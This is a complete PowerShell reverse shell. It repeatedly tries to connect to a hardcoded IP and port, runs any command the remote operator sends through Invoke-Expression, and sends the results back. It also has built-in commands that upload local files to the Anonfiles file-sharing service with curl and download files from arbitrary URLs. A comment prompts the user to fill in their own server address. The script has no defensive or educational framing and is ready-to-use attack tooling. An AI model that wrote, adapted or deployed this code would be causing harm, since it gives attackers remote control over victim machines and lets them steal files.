do
{
	Start-Sleep -Seconds 1
	try
	{
		$TCPClient = New-Object Net.Sockets.TCPClient('10.1.0.164', 6969) #input server IP , port
	}
	catch { }
}
until ($TCPClient.Connected)

$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)

function InvokeCustomCommands ($Action)
{
	$SplitAction = $Action.Split()
	if ($Action -eq "help")
	{
		WriteToStream "
/exit - ends the connection
/upload [filename] - uploads a file to Anonfiles
/download [uri] [filename] - downloads a file frome the web
"		
	}
	#end connection
	if ($Action -eq "exit") { $StreamWriter.Close() }
	
	#upload a file
	if ($SplitAction[0] -eq "upload")
	{
		function AnonUpload ($file) { cmd /c "curl -F "file=@$file" https://api.anonfiles.com/upload" | Select-String "full" -OutVariable filelink; WriteToStream ("Download Here:" + $filelink) }
		$file = $SplitAction[1]
		if (((Test-Path $file) -eq $true) -and ((Get-Item $file).Extension -ne "")) { $file = (Get-Item $file).FullName; AnonUpload ($file) }
		else { WriteToStream "No Such File!" }
	}
	#download a file
	if ($SplitAction[0] -eq "download")
	{
		try { Invoke-WebRequest -Uri $SplitAction[1] -OutFile $SplitAction[2] }
		catch { WriteToStream "Error Downloading!" }
	}
	
	else { WriteToStream "Invalid Command!" }
	
}

function WriteToStream ($String)
{
	[byte[]]$script:Buffer = 0 .. $TCPClient.ReceiveBufferSize | ForEach-Object { 0 }
	
	$StreamWriter.Write($String + "`n[DEEZ NUTS] > ")
	$StreamWriter.Flush()
	
	Write-Host $String
}

WriteToStream ''

while (($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0)
{
	$Command = ([text.encoding]::ASCII).GetString($Buffer, 0, $BytesRead - 1)
	if ($Command.Substring(0, 1) -eq "/") { InvokeCustomCommands  $Command.Substring(1) }
	else
	{
		$Output = try
		{
			Invoke-Expression $Command 2>&1 | Out-String
		}
		catch
		{
			$_ | Out-String
		}
		
		
		WriteToStream ($Output)
	}
}
$StreamWriter.Close()
Clear-Host
